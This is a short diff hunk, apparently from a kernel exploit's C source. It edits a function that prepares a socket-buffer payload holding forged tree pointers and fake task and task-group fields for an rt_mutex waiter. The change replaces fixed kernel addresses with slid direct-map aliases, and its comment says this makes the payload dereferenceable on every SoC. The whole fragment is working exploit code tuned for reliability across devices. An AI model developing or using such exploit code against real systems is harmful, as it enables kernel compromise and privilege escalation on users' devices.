@@ -371,9 +371,12 @@ int prepare_skb_payload(uintptr_t base) {
   uintptr_t write_pc = fake_parent;
   uintptr_t write_right = fake_right;
   uintptr_t write_left = fake_left;
-  uint64_t waiter_task = INIT_TASK;
-  uint64_t task_group = ROOT_TASK_GROUP;
-  uint64_t pi_top_task = INIT_TASK;
+  /* Direct-map aliases (data_addr) resolve to the same physical pages and 
+   * are dereferenceable on every SoC — the tcp route already uses SLIDE_INIT_TASK 
+   * the same way for the on-stack waiter. */
+  uint64_t waiter_task = SLIDE_INIT_TASK;
+  uint64_t task_group = SLIDE_ROOT_TASK_GROUP;
+  uint64_t pi_top_task = SLIDE_INIT_TASK;
 
   int compact = active_offsets && active_offsets->compact_waiter;
 
